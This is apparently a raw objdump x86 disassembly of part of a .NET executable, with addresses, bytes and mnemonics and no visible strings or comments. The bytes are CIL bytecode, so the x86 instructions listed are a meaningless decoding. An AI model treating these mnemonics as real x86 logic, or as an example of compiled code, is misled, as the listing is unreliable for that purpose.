  403c0b:	00 70 28             	add    %dh,0x28(%eax)
  403c0e:	1e                   	push   %ds
  403c0f:	00 00                	add    %al,(%eax)
  403c11:	0a 00                	or     (%eax),%al
  403c13:	72 e8                	jb     0x403bfd
  403c15:	11 00                	adc    %eax,(%eax)
  403c17:	70 08                	jo     0x403c21
  403c19:	6f                   	outsl  %ds:(%esi),(%dx)
  403c1a:	21 00                	and    %eax,(%eax)
  403c1c:	00 0a                	add    %cl,(%edx)
  403c1e:	28 22                	sub    %ah,(%edx)
  403c20:	00 00                	add    %al,(%eax)
  403c22:	0a 28                	or     (%eax),%ch
  403c24:	1e                   	push   %ds
  403c25:	00 00                	add    %al,(%eax)
  403c27:	0a 00                	or     (%eax),%al
  403c29:	16                   	push   %ss
  403c2a:	0d de 0b 06 6f       	or     $0x6f060bde,%eax
  403c2f:	1f                   	pop    %ds
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 00                	or     (%eax),%al
  403c34:	17                   	pop    %ss
  403c35:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	01 10                	add    %edx,(%eax)
  403c3e:	00 00                	add    %al,(%eax)
  403c40:	00 00                	add    %al,(%eax)
  403c42:	51                   	push   %ecx
  403c43:	00 1d 6e 00 27 16    	add    %bl,0x1627006e
  403c49:	00 00                	add    %al,(%eax)
  403c4b:	01 1b                	add    %ebx,(%ebx)
  403c4d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403c50:	cf                   	iret
  403c51:	00 00                	add    %al,(%eax)
  403c53:	00 17                	add    %dl,(%edi)
  403c55:	00 00                	add    %al,(%eax)
  403c57:	11 00                	adc    %eax,(%eax)
  403c59:	02 72 3c             	add    0x3c(%edx),%dh
  403c5c:	49                   	dec    %ecx
  403c5d:	00 70 03             	add    %dh,0x3(%eax)
  403c60:	72 e9                	jb     0x403c4b
  403c62:	3e 00 70 28          	add    %dh,%ds:0x28(%eax)
  403c66:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  403c6b:	18 00                	sbb    %al,(%eax)
  403c6d:	00 0a                	add    %cl,(%edx)
  403c6f:	00 00                	add    %al,(%eax)
  403c71:	02 6f 19             	add    0x19(%edi),%ch
  403c74:	00 00                	add    %al,(%eax)
  403c76:	0a 0a                	or     (%edx),%cl
  403c78:	06                   	push   %es
  403c79:	6f                   	outsl  %ds:(%esi),(%dx)
  403c7a:	1f                   	pop    %ds
  403c7b:	00 00                	add    %al,(%eax)
  403c7d:	0a 00                	or     (%eax),%al
  403c7f:	72 7e                	jb     0x403cff
  403c81:	49                   	dec    %ecx
  403c82:	00 70 28             	add    %dh,0x28(%eax)
  403c85:	1e                   	push   %ds
  403c86:	00 00                	add    %al,(%eax)
  403c88:	0a 00                	or     (%eax),%al
  403c8a:	00 de                	add    %bl,%dh
  403c8c:	27                   	daa
  403c8d:	0b 00                	or     (%eax),%eax
  403c8f:	72 b0                	jb     0x403c41
  403c91:	49                   	dec    %ecx
  403c92:	00 70 28             	add    %dh,0x28(%eax)
  403c95:	1e                   	push   %ds
  403c96:	00 00                	add    %al,(%eax)
  403c98:	0a 00                	or     (%eax),%al
  403c9a:	72 e8                	jb     0x403c84
  403c9c:	11 00                	adc    %eax,(%eax)
  403c9e:	70 07                	jo     0x403ca7
  403ca0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ca1:	21 00                	and    %eax,(%eax)
  403ca3:	00 0a                	add    %cl,(%edx)
  403ca5:	28 22                	sub    %ah,(%edx)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	0a 28                	or     (%eax),%ch
  403cab:	1e                   	push   %ds
  403cac:	00 00                	add    %al,(%eax)
  403cae:	0a 00                	or     (%eax),%al
  403cb0:	16                   	push   %ss
  403cb1:	0c de                	or     $0xde,%al
  403cb3:	71 02                	jno    0x403cb7
  403cb5:	72 f6                	jb     0x403cad
  403cb7:	49                   	dec    %ecx
  403cb8:	00 70 03             	add    %dh,0x3(%eax)
  403cbb:	72 e9                	jb     0x403ca6
  403cbd:	3e 00 70 28          	add    %dh,%ds:0x28(%eax)
  403cc1:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  403cc6:	18 00                	sbb    %al,(%eax)
  403cc8:	00 0a                	add    %cl,(%edx)
  403cca:	00 00                	add    %al,(%eax)
  403ccc:	02 6f 19             	add    0x19(%edi),%ch
  403ccf:	00 00                	add    %al,(%eax)
  403cd1:	0a 0a                	or     (%edx),%cl
  403cd3:	06                   	push   %es
  403cd4:	6f                   	outsl  %ds:(%esi),(%dx)
  403cd5:	1f                   	pop    %ds
  403cd6:	00 00                	add    %al,(%eax)
  403cd8:	0a 00                	or     (%eax),%al
  403cda:	72 4a                	jb     0x403d26
  403cdc:	4a                   	dec    %edx
  403cdd:	00 70 28             	add    %dh,0x28(%eax)
  403ce0:	1e                   	push   %ds
  403ce1:	00 00                	add    %al,(%eax)
  403ce3:	0a 00                	or     (%eax),%al
  403ce5:	00 de                	add    %bl,%dh
  403ce7:	32 0d 00 72 b0 49    	xor    0x49b07200,%cl
  403ced:	00 70 28             	add    %dh,0x28(%eax)
  403cf0:	1e                   	push   %ds
  403cf1:	00 00                	add    %al,(%eax)
  403cf3:	0a 00                	or     (%eax),%al
  403cf5:	72 e8                	jb     0x403cdf
  403cf7:	11 00                	adc    %eax,(%eax)
  403cf9:	70 09                	jo     0x403d04
  403cfb:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfc:	21 00                	and    %eax,(%eax)
  403cfe:	00 0a                	add    %cl,(%edx)
  403d00:	28 22                	sub    %ah,(%edx)
  403d02:	00 00                	add    %al,(%eax)
  403d04:	0a 28                	or     (%eax),%ch
  403d06:	1e                   	push   %ds
  403d07:	00 00                	add    %al,(%eax)
  403d09:	0a 00                	or     (%eax),%al
  403d0b:	72 7a                	jb     0x403d87
  403d0d:	4a                   	dec    %edx
  403d0e:	00 70 28             	add    %dh,0x28(%eax)
  403d11:	1e                   	push   %ds
  403d12:	00 00                	add    %al,(%eax)
  403d14:	0a 00                	or     (%eax),%al
  403d16:	16                   	push   %ss
  403d17:	0c de                	or     $0xde,%al
  403d19:	0b 06                	or     (%esi),%eax
  403d1b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d1c:	1f                   	pop    %ds
  403d1d:	00 00                	add    %al,(%eax)
  403d1f:	0a 00                	or     (%eax),%al
  403d21:	17                   	pop    %ss
  403d22:	0c 2b                	or     $0x2b,%al
  403d24:	00 08                	add    %cl,(%eax)
  403d26:	2a 00                	sub    (%eax),%al
  403d28:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d2b:	00 00                	add    %al,(%eax)
  403d2d:	00 18                	add    %bl,(%eax)
  403d2f:	00 1d 35 00 27 16    	add    %bl,0x16270035
  403d35:	00 00                	add    %al,(%eax)
  403d37:	01 00                	add    %eax,(%eax)
  403d39:	00 73 00             	add    %dh,0x0(%ebx)
  403d3c:	1d 90 00 32 16       	sbb    $0x16320090,%eax
  403d41:	00 00                	add    %al,(%eax)
  403d43:	01 1b                	add    %ebx,(%ebx)
  403d45:	30 05 00 0d 02 00    	xor    %al,0x20d00
  403d4b:	00 18                	add    %bl,(%eax)
  403d4d:	00 00                	add    %al,(%eax)
  403d4f:	11 00                	adc    %eax,(%eax)
  403d51:	16                   	push   %ss
  403d52:	0a 02                	or     (%edx),%al
  403d54:	72 89                	jb     0x403cdf
  403d56:	4b                   	dec    %ebx
  403d57:	00 70 03             	add    %dh,0x3(%eax)
  403d5a:	72 e9                	jb     0x403d45
  403d5c:	3e 00 70 28          	add    %dh,%ds:0x28(%eax)
  403d60:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  403d65:	18 00                	sbb    %al,(%eax)
  403d67:	00 0a                	add    %cl,(%edx)
  403d69:	00 00                	add    %al,(%eax)
  403d6b:	02 6f 19             	add    0x19(%edi),%ch
  403d6e:	00 00                	add    %al,(%eax)
  403d70:	0a 0b                	or     (%ebx),%cl
  403d72:	00 de                	add    %bl,%dh
  403d74:	2a 0c 00             	sub    (%eax,%eax,1),%cl
  403d77:	72 fd                	jb     0x403d76
  403d79:	4b                   	dec    %ebx
  403d7a:	00 70 28             	add    %dh,0x28(%eax)
  403d7d:	1e                   	push   %ds
  403d7e:	00 00                	add    %al,(%eax)
  403d80:	0a 00                	or     (%eax),%al
  403d82:	72 e8                	jb     0x403d6c
  403d84:	11 00                	adc    %eax,(%eax)
  403d86:	70 08                	jo     0x403d90
  403d88:	6f                   	outsl  %ds:(%esi),(%dx)
  403d89:	21 00                	and    %eax,(%eax)
  403d8b:	00 0a                	add    %cl,(%edx)
  403d8d:	28 22                	sub    %ah,(%edx)
  403d8f:	00 00                	add    %al,(%eax)
  403d91:	0a 28                	or     (%eax),%ch
  403d93:	1e                   	push   %ds
  403d94:	00 00                	add    %al,(%eax)
  403d96:	0a 00                	or     (%eax),%al
  403d98:	16                   	push   %ss
  403d99:	0d dd bc 01 00       	or     $0x1bcdd,%eax
  403d9e:	00 07                	add    %al,(%edi)
  403da0:	6f                   	outsl  %ds:(%esi),(%dx)
  403da1:	2a 00                	sub    (%eax),%al
  403da3:	00 0a                	add    %cl,(%edx)
  403da5:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403da8:	04 2c                	add    $0x2c,%al
  403daa:	22 00                	and    (%eax),%al
  403dac:	07                   	pop    %es
  403dad:	07                   	pop    %es
  403dae:	72 49                	jb     0x403df9
  403db0:	4c                   	dec    %esp
  403db1:	00 70 6f             	add    %dh,0x6f(%eax)
  403db4:	2b 00                	sub    (%eax),%eax
  403db6:	00 0a                	add    %cl,(%edx)
  403db8:	6f                   	outsl  %ds:(%esi),(%dx)
  403db9:	2c 00                	sub    $0x0,%al
  403dbb:	00 0a                	add    %cl,(%edx)
  403dbd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403dbe:	29 00                	sub    %eax,(%eax)
  403dc0:	00 01                	add    %al,(%ecx)
  403dc2:	0a 07                	or     (%edi),%al
  403dc4:	6f                   	outsl  %ds:(%esi),(%dx)
  403dc5:	1f                   	pop    %ds
  403dc6:	00 00                	add    %al,(%eax)
  403dc8:	0a 00                	or     (%eax),%al
  403dca:	00 2b                	add    %ch,(%ebx)
  403dcc:	1e                   	push   %ds
  403dcd:	00 72 65             	add    %dh,0x65(%edx)
  403dd0:	4c                   	dec    %esp
  403dd1:	00 70 03             	add    %dh,0x3(%eax)
  403dd4:	72 7f                	jb     0x403e55
  403dd6:	4c                   	dec    %esp
  403dd7:	00 70 28             	add    %dh,0x28(%eax)
  403dda:	15 00 00 0a 28       	adc    $0x280a0000,%eax
  403ddf:	1e                   	push   %ds
  403de0:	00 00                	add    %al,(%eax)
  403de2:	0a 00                	or     (%eax),%al
  403de4:	16                   	push   %ss
  403de5:	0d 38 70 01 00       	or     $0x17038,%eax
  403dea:	00 02                	add    %al,(%edx)
  403dec:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  403df2:	25 16 72 a3 4c       	and    $0x4ca37216,%eax
  403df7:	00 70 a2             	add    %dh,-0x5e(%eax)
  403dfa:	25 17 12 00 28       	and    $0x28001217,%eax
  403dff:	24 00                	and    $0x0,%al
  403e01:	00 0a                	add    %cl,(%edx)
  403e03:	a2 25 18 72 4a       	mov    %al,0x4a721825
  403e08:	4d                   	dec    %ebp
  403e09:	00 70 a2             	add    %dh,-0x5e(%eax)
  403e0c:	25 19 7f 15 00       	and    $0x157f19,%eax
  403e11:	00 04 28             	add    %al,(%eax,%ebp,1)
  403e14:	24 00                	and    $0x0,%al
  403e16:	00 0a                	add    %cl,(%edx)
  403e18:	a2 25 1a 72 e9       	mov    %al,0xe9721a25
  403e1d:	3e 00 70 a2          	add    %dh,%ds:-0x5e(%eax)
  403e21:	28 17                	sub    %dl,(%edi)
  403e23:	00 00                	add    %al,(%eax)
  403e25:	0a 6f 18             	or     0x18(%edi),%ch
  403e28:	00 00                	add    %al,(%eax)
  403e2a:	0a 00                	or     (%eax),%al
  403e2c:	00 02                	add    %al,(%edx)
  403e2e:	6f                   	outsl  %ds:(%esi),(%dx)
  403e2f:	19 00                	sbb    %eax,(%eax)
  403e31:	00 0a                	add    %cl,(%edx)
  403e33:	0b 00                	or     (%eax),%eax
  403e35:	de 2c 13             	fisubrs (%ebx,%edx,1)
  403e38:	05 00 72 6c 4d       	add    $0x4d6c7200,%eax
  403e3d:	00 70 28             	add    %dh,0x28(%eax)
  403e40:	1e                   	push   %ds
  403e41:	00 00                	add    %al,(%eax)
  403e43:	0a 00                	or     (%eax),%al
  403e45:	72 e8                	jb     0x403e2f
  403e47:	11 00                	adc    %eax,(%eax)
  403e49:	70 11                	jo     0x403e5c
  403e4b:	05 6f 21 00 00       	add    $0x216f,%eax
  403e50:	0a 28                	or     (%eax),%ch
  403e52:	22 00                	and    (%eax),%al
  403e54:	00 0a                	add    %cl,(%edx)
  403e56:	28 1e                	sub    %bl,(%esi)
  403e58:	00 00                	add    %al,(%eax)
  403e5a:	0a 00                	or     (%eax),%al
  403e5c:	16                   	push   %ss
  403e5d:	0d dd f8 00 00       	or     $0xf8dd,%eax
  403e62:	00 07                	add    %al,(%edi)
  403e64:	6f                   	outsl  %ds:(%esi),(%dx)
  403e65:	2a 00                	sub    (%eax),%al
  403e67:	00 0a                	add    %cl,(%edx)
  403e69:	13 06                	adc    (%esi),%eax
  403e6b:	11 06                	adc    %eax,(%esi)
  403e6d:	39 d1                	cmp    %edx,%ecx
  403e6f:	00 00                	add    %al,(%eax)
  403e71:	00 00                	add    %al,(%eax)
  403e73:	07                   	pop    %es
  403e74:	07                   	pop    %es
  403e75:	72 ba                	jb     0x403e31
  403e77:	4d                   	dec    %ebp
  403e78:	00 70 6f             	add    %dh,0x6f(%eax)
  403e7b:	2b 00                	sub    (%eax),%eax
  403e7d:	00 0a                	add    %cl,(%edx)
  403e7f:	6f                   	outsl  %ds:(%esi),(%dx)
  403e80:	2c 00                	sub    $0x0,%al
  403e82:	00 0a                	add    %cl,(%edx)
  403e84:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403e85:	29 00                	sub    %eax,(%eax)
  403e87:	00 01                	add    %al,(%ecx)
  403e89:	13 07                	adc    (%edi),%eax
  403e8b:	11 07                	adc    %eax,(%edi)
  403e8d:	17                   	pop    %ss
  403e8e:	fe 01                	incb   (%ecx)
  403e90:	13 08                	adc    (%eax),%ecx
  403e92:	11 08                	adc    %ecx,(%eax)
  403e94:	2c 13                	sub    $0x13,%al
  403e96:	00 72 e0             	add    %dh,-0x20(%edx)
  403e99:	4d                   	dec    %ebp
  403e9a:	00 70 28             	add    %dh,0x28(%eax)
  403e9d:	1e                   	push   %ds
  403e9e:	00 00                	add    %al,(%eax)
  403ea0:	0a 00                	or     (%eax),%al
  403ea2:	17                   	pop    %ss
  403ea3:	0d 38 b2 00 00       	or     $0xb238,%eax
  403ea8:	00 11                	add    %dl,(%ecx)
  403eaa:	07                   	pop    %es
  403eab:	18 fe                	sbb    %bh,%dh
  403ead:	01 13                	add    %edx,(%ebx)
  403eaf:	09 11                	or     %edx,(%ecx)
  403eb1:	09 2c 13             	or     %ebp,(%ebx,%edx,1)
  403eb4:	00 72 16             	add    %dh,0x16(%edx)
  403eb7:	4e                   	dec    %esi
  403eb8:	00 70 28             	add    %dh,0x28(%eax)
  403ebb:	1e                   	push   %ds
  403ebc:	00 00                	add    %al,(%eax)
  403ebe:	0a 00                	or     (%eax),%al
  403ec0:	17                   	pop    %ss
  403ec1:	0d 38 94 00 00       	or     $0x9438,%eax
  403ec6:	00 11                	add    %dl,(%ecx)
  403ec8:	07                   	pop    %es
  403ec9:	19 fe                	sbb    %edi,%esi
  403ecb:	01 13                	add    %edx,(%ebx)
  403ecd:	0a 11                	or     (%ecx),%dl
  403ecf:	0a 2c 10             	or     (%eax,%edx,1),%ch
  403ed2:	00 72 52             	add    %dh,0x52(%edx)
  403ed5:	4e                   	dec    %esi
  403ed6:	00 70 28             	add    %dh,0x28(%eax)
  403ed9:	1e                   	push   %ds
  403eda:	00 00                	add    %al,(%eax)
  403edc:	0a 00                	or     (%eax),%al
  403ede:	17                   	pop    %ss
  403edf:	0d 2b 79 11 07       	or     $0x711792b,%eax
  403ee4:	1a fe                	sbb    %dh,%bh
  403ee6:	01 13                	add    %edx,(%ebx)
  403ee8:	0b 11                	or     (%ecx),%edx
  403eea:	0b 2c 10             	or     (%eax,%edx,1),%ebp
  403eed:	00 72 88             	add    %dh,-0x78(%edx)
  403ef0:	4e                   	dec    %esi
  403ef1:	00 70 28             	add    %dh,0x28(%eax)
  403ef4:	1e                   	push   %ds
  403ef5:	00 00                	add    %al,(%eax)
  403ef7:	0a 00                	or     (%eax),%al
  403ef9:	17                   	pop    %ss
  403efa:	0d 2b 5e 11 07       	or     $0x7115e2b,%eax
  403eff:	1b fe                	sbb    %esi,%edi
  403f01:	01 13                	add    %edx,(%ebx)
  403f03:	0c 11                	or     $0x11,%al
  403f05:	0c 2c                	or     $0x2c,%al
  403f07:	10 00                	adc    %al,(%eax)
  403f09:	72 bc                	jb     0x403ec7
  403f0b:	4e                   	dec    %esi
  403f0c:	00 70 28             	add    %dh,0x28(%eax)
  403f0f:	1e                   	push   %ds
  403f10:	00 00                	add    %al,(%eax)
  403f12:	0a 00                	or     (%eax),%al
  403f14:	17                   	pop    %ss
  403f15:	0d 2b 43 11 07       	or     $0x711432b,%eax
  403f1a:	1c fe                	sbb    $0xfe,%al
  403f1c:	01 13                	add    %edx,(%ebx)
  403f1e:	0d 11 0d 2c 10       	or     $0x102c0d11,%eax
  403f23:	00 72 e4             	add    %dh,-0x1c(%edx)
  403f26:	4e                   	dec    %esi
  403f27:	00 70 28             	add    %dh,0x28(%eax)
  403f2a:	1e                   	push   %ds
  403f2b:	00 00                	add    %al,(%eax)
  403f2d:	0a 00                	or     (%eax),%al
  403f2f:	17                   	pop    %ss
  403f30:	0d 2b 28 00 72       	or     $0x7200282b,%eax
  403f35:	10 4f 00             	adc    %cl,0x0(%edi)
  403f38:	70 28                	jo     0x403f62
  403f3a:	1e                   	push   %ds
  403f3b:	00 00                	add    %al,(%eax)
  403f3d:	0a 00                	or     (%eax),%al
  403f3f:	17                   	pop    %ss
  403f40:	0d 2b 18 00 72       	or     $0x7200182b,%eax
  403f45:	72 4f                	jb     0x403f96
  403f47:	00 70 28             	add    %dh,0x28(%eax)
  403f4a:	1e                   	push   %ds
  403f4b:	00 00                	add    %al,(%eax)
  403f4d:	0a 00                	or     (%eax),%al
  403f4f:	00 07                	add    %al,(%edi)
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	1f                   	pop    %ds
  403f53:	00 00                	add    %al,(%eax)
  403f55:	0a 00                	or     (%eax),%al
  403f57:	17                   	pop    %ss
  403f58:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
  403f5d:	00 00                	add    %al,(%eax)
  403f5f:	00 01                	add    %al,(%ecx)
  403f61:	1c 00                	sbb    $0x0,%al
  403f63:	00 00                	add    %al,(%eax)
  403f65:	00 1a                	add    %bl,(%edx)
  403f67:	00 0b                	add    %cl,(%ebx)
  403f69:	25 00 2a 16 00       	and    $0x162a00,%eax
  403f6e:	00 01                	add    %al,(%ecx)
  403f70:	00 00                	add    %al,(%eax)
  403f72:	dc 00                	faddl  (%eax)
  403f74:	0b e7                	or     %edi,%esp
  403f76:	00 2c 16             	add    %ch,(%esi,%edx,1)
  403f79:	00 00                	add    %al,(%eax)
  403f7b:	01 22                	add    %esp,(%edx)
  403f7d:	02 28                	add    (%eax),%ch
  403f7f:	25 00 00 0a 00       	and    $0xa0000,%eax
  403f84:	2a 00                	sub    (%eax),%al
  403f86:	00 00                	add    %al,(%eax)
  403f88:	1b 30                	sbb    (%eax),%esi
  403f8a:	03 00                	add    (%eax),%eax
  403f8c:	3e 00 00             	add    %al,%ds:(%eax)
  403f8f:	00 19                	add    %bl,(%ecx)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	11 00                	adc    %eax,(%eax)
  403f95:	28 4d 00             	sub    %cl,0x0(%ebp)
  403f98:	00 06                	add    %al,(%esi)
  403f9a:	00 00                	add    %al,(%eax)
  403f9c:	73 4b                	jae    0x403fe9
  403f9e:	00 00                	add    %al,(%eax)
  403fa0:	06                   	push   %es
  403fa1:	02 03                	add    (%ebx),%al
  403fa3:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  403fa7:	06                   	push   %es
  403fa8:	0a 06                	or     (%esi),%al
  403faa:	16                   	push   %ss
  403fab:	fe 01                	incb   (%ecx)
  403fad:	0b 07                	or     (%edi),%eax
  403faf:	2c 06                	sub    $0x6,%al
  403fb1:	28 4e 00             	sub    %cl,0x0(%esi)
  403fb4:	00 06                	add    %al,(%esi)
  403fb6:	00 00                	add    %al,(%eax)
  403fb8:	de 17                	ficoms (%edi)
  403fba:	0c 00                	or     $0x0,%al
  403fbc:	72 b0                	jb     0x403f6e
  403fbe:	4f                   	dec    %edi
  403fbf:	00 70 28             	add    %dh,0x28(%eax)
  403fc2:	1e                   	push   %ds
  403fc3:	00 00                	add    %al,(%eax)
  403fc5:	0a 00                	or     (%eax),%al
  403fc7:	08 28                	or     %ch,(%eax)
  403fc9:	4a                   	dec    %edx
  403fca:	00 00                	add    %al,(%eax)
  403fcc:	0a 00                	or     (%eax),%al
  403fce:	00 de                	add    %bl,%dh
  403fd0:	00 2a                	add    %ch,(%edx)
  403fd2:	00 00                	add    %al,(%eax)
  403fd4:	01 10                	add    %edx,(%eax)
  403fd6:	00 00                	add    %al,(%eax)
  403fd8:	00 00                	add    %al,(%eax)
  403fda:	07                   	pop    %es
  403fdb:	00 1f                	add    %bl,(%edi)
  403fdd:	26 00 17             	add    %dl,%es:(%edi)
  403fe0:	16                   	push   %ss
  403fe1:	00 00                	add    %al,(%eax)
  403fe3:	01 13                	add    %edx,(%ebx)
  403fe5:	30 02                	xor    %al,(%edx)
  403fe7:	00 41 00             	add    %al,0x0(%ecx)
  403fea:	00 00                	add    %al,(%eax)
  403fec:	1a 00                	sbb    (%eax),%al
  403fee:	00 11                	add    %dl,(%ecx)
  403ff0:	00 02                	add    %al,(%edx)
  403ff2:	28 45 00             	sub    %al,0x0(%ebp)
  403ff5:	00 06                	add    %al,(%esi)
  403ff7:	0a 06                	or     (%esi),%al
  403ff9:	6f                   	outsl  %ds:(%esi),(%dx)
  403ffa:	46                   	inc    %esi
  403ffb:	00 00                	add    %al,(%eax)
  403ffd:	06                   	push   %es
  403ffe:	16                   	push   %ss
  403fff:	fe 01                	incb   (%ecx)
  404001:	0c 08                	or     $0x8,%al
  404003:	2c 0f                	sub    $0xf,%al
  404005:	00 28                	add    %ch,(%eax)
  404007:	4d                   	dec    %ebp
  404008:	00 00                	add    %al,(%eax)
  40400a:	06                   	push   %es
  40400b:	00 28                	add    %ch,(%eax)
  40400d:	4e                   	dec    %esi
  40400e:	00 00                	add    %al,(%eax)
  404010:	06                   	push   %es
  404011:	00 2b                	add    %ch,(%ebx)
  404013:	1c 02                	sbb    $0x2,%al
  404015:	8e 2d 07 72 fe 4f    	mov    0x4ffe7207,%gs
  40401b:	00 70 2b             	add    %dh,0x2b(%eax)
  40401e:	03 02                	add    (%edx),%eax
  404020:	16                   	push   %ss
  404021:	9a 0b 07 06 6f 47 00 	lcall  $0x47,$0x6f06070b
  404028:	00 06                	add    %al,(%esi)
  40402a:	28 2e                	sub    %ch,(%esi)
  40402c:	00 00                	add    %al,(%eax)
  40402e:	06                   	push   %es
  40402f:	00 2a                	add    %ch,(%edx)
  404031:	22 02                	and    (%edx),%al
  404033:	28 25 00 00 0a 00    	sub    %ah,0xa0000
  404039:	2a 1a                	sub    (%edx),%bl
  40403b:	72 00                	jb     0x40403d
  40403d:	50                   	push   %eax
  40403e:	00 70 2a             	add    %dh,0x2a(%eax)
  404041:	00 00                	add    %al,(%eax)
  404043:	00 13                	add    %dl,(%ebx)
  404045:	30 03                	xor    %al,(%ebx)
  404047:	00 65 01             	add    %ah,0x1(%ebp)
  40404a:	00 00                	add    %al,(%eax)
  40404c:	1b 00                	sbb    (%eax),%eax
  40404e:	00 11                	add    %dl,(%ecx)
  404050:	00 72 10             	add    %dh,0x10(%edx)
  404053:	50                   	push   %eax
  404054:	00 70 28             	add    %dh,0x28(%eax)
  404057:	1e                   	push   %ds
  404058:	00 00                	add    %al,(%eax)
  40405a:	0a 00                	or     (%eax),%al
  40405c:	72 fe                	jb     0x40405c
  40405e:	4f                   	dec    %edi
  40405f:	00 70 0a             	add    %dh,0xa(%eax)
  404062:	72 fe                	jb     0x404062
  404064:	4f                   	dec    %edi
  404065:	00 70 0b             	add    %dh,0xb(%eax)
  404068:	72 46                	jb     0x4040b0
  40406a:	50                   	push   %eax
  40406b:	00 70 0c             	add    %dh,0xc(%eax)
  40406e:	72 5e                	jb     0x4040ce
  404070:	50                   	push   %eax
  404071:	00 70 0d             	add    %dh,0xd(%eax)
  404074:	16                   	push   %ss
  404075:	80 08 00             	orb    $0x0,(%eax)
  404078:	00 04 03             	add    %al,(%ebx,%eax,1)
  40407b:	72 74                	jb     0x4040f1
  40407d:	50                   	push   %eax
  40407e:	00 70 6f             	add    %dh,0x6f(%eax)
  404081:	4b                   	dec    %ebx
  404082:	00 00                	add    %al,(%eax)
  404084:	0a 13                	or     (%ebx),%dl
  404086:	05 11 05 2c 0e       	add    $0xe2c0511,%eax
  40408b:	00 03                	add    %al,(%ebx)
  40408d:	72 74                	jb     0x404103
  40408f:	50                   	push   %eax
  404090:	00 70 6f             	add    %dh,0x6f(%eax)
  404093:	4c                   	dec    %esp
  404094:	00 00                	add    %al,(%eax)
  404096:	0a 0a                	or     (%edx),%cl
  404098:	00 03                	add    %al,(%ebx)
  40409a:	72 88                	jb     0x404024
  40409c:	50                   	push   %eax
  40409d:	00 70 6f             	add    %dh,0x6f(%eax)
  4040a0:	4b                   	dec    %ebx
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	0a 13                	or     (%ebx),%dl
  4040a5:	06                   	push   %es
  4040a6:	11 06                	adc    %eax,(%esi)
  4040a8:	2c 0e                	sub    $0xe,%al
  4040aa:	00 03                	add    %al,(%ebx)
  4040ac:	72 88                	jb     0x404036
  4040ae:	50                   	push   %eax
  4040af:	00 70 6f             	add    %dh,0x6f(%eax)
  4040b2:	4c                   	dec    %esp
  4040b3:	00 00                	add    %al,(%eax)
  4040b5:	0a 0b                	or     (%ebx),%cl
  4040b7:	00 03                	add    %al,(%ebx)
  4040b9:	72 a4                	jb     0x40405f
  4040bb:	50                   	push   %eax
  4040bc:	00 70 6f             	add    %dh,0x6f(%eax)
  4040bf:	4b                   	dec    %ebx
  4040c0:	00 00                	add    %al,(%eax)
  4040c2:	0a 13                	or     (%ebx),%dl
  4040c4:	07                   	pop    %es
  4040c5:	11 07                	adc    %eax,(%edi)
  4040c7:	2c 0e                	sub    $0xe,%al
  4040c9:	00 03                	add    %al,(%ebx)
  4040cb:	72 a4                	jb     0x404071
  4040cd:	50                   	push   %eax
  4040ce:	00 70 6f             	add    %dh,0x6f(%eax)
  4040d1:	4c                   	dec    %esp
  4040d2:	00 00                	add    %al,(%eax)
  4040d4:	0a 0c 00             	or     (%eax,%eax,1),%cl
  4040d7:	03 72 ba             	add    -0x46(%edx),%esi
  4040da:	50                   	push   %eax
  4040db:	00 70 6f             	add    %dh,0x6f(%eax)
  4040de:	4b                   	dec    %ebx
  4040df:	00 00                	add    %al,(%eax)
  4040e1:	0a 13                	or     (%ebx),%dl
  4040e3:	08 11                	or     %dl,(%ecx)
  4040e5:	08 2c 0e             	or     %ch,(%esi,%ecx,1)
  4040e8:	00 03                	add    %al,(%ebx)
  4040ea:	72 ba                	jb     0x4040a6
  4040ec:	50                   	push   %eax
  4040ed:	00 70 6f             	add    %dh,0x6f(%eax)
  4040f0:	4c                   	dec    %esp
  4040f1:	00 00                	add    %al,(%eax)
  4040f3:	0a 0d 00 28 20 00    	or     0x202800,%cl
  4040f9:	00 06                	add    %al,(%esi)
  4040fb:	00 73 4d             	add    %dh,0x4d(%ebx)
  4040fe:	00 00                	add    %al,(%eax)
  404100:	0a 13                	or     (%ebx),%dl
  404102:	04 11                	add    $0x11,%al
  404104:	04 28                	add    $0x28,%al
  404106:	08 00                	or     %al,(%eax)
  404108:	00 06                	add    %al,(%esi)
  40410a:	6f                   	outsl  %ds:(%esi),(%dx)
  40410b:	4e                   	dec    %esi
  40410c:	00 00                	add    %al,(%eax)
  40410e:	0a 00                	or     (%eax),%al
  404110:	28 1d 00 00 06 00    	sub    %bl,0x60000
  404116:	11 04 07             	adc    %eax,(%edi,%eax,1)
  404119:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40411c:	00 06                	add    %al,(%esi)
  40411e:	16                   	push   %ss
  40411f:	fe 01                	incb   (%ecx)
  404121:	13 09                	adc    (%ecx),%ecx
  404123:	11 09                	adc    %ecx,(%ecx)
  404125:	2c 06                	sub    $0x6,%al
  404127:	00 38                	add    %bh,(%eax)
  404129:	87 00                	xchg   %eax,(%eax)
  40412b:	00 00                	add    %al,(%eax)
  40412d:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  404130:	28 15 00 00 06 16    	sub    %dl,0x16060000
  404136:	fe 01                	incb   (%ecx)
  404138:	13 0a                	adc    (%edx),%ecx
  40413a:	11 0a                	adc    %ecx,(%edx)
  40413c:	2c 03                	sub    $0x3,%al
  40413e:	00 2b                	add    %ch,(%ebx)
  404140:	73 72                	jae    0x4041b4
  404142:	ce                   	into
  404143:	50                   	push   %eax
  404144:	00 70 7e             	add    %dh,0x7e(%eax)
  404147:	08 00                	or     %al,(%eax)
